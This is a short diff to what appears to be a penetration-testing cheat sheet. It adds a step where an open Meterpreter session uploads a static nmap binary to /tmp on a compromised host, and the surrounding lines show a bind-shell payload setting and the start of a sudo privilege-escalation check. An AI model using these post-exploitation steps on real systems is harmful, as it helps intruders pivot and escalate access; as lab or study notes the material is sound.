@@ -477,6 +477,10 @@ set payload windows/meterpreter/bind_tcp
 ```
 - `LPORT` will be opened on `<ip2>`.
 
+```
+meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
+```
+
 ## SUDO Privileges
 ```
 sudo -l
